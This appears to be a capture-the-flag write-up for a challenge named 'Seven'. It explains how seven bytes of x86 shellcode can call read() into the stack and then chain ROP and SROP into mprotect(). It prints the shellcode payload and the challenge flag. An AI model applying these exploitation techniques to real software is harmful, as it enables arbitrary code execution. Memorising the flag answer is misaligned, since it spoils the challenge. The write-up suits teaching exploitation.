# Seven

Author: `nhwn`

Seven-byte shellcode!?

## Solution

The main idea is to ROP; use the initial seven bytes to syscall `read()` into `rsp`, then reuse the bytes as gadgets to SROP into `mprotect()`.

I used the following payload (others are possible):

```x86asm
push rsp
pop rsi
xor edi, edi
syscall
ret
```

Setting `rax` to `SYS_rt_sigreturn` can be done via the classic trick of abusing the return value of `read()`. See `solve.py` for the full solve.

flag:
`gigem{my_challenge_names_are_so_creative_right}`
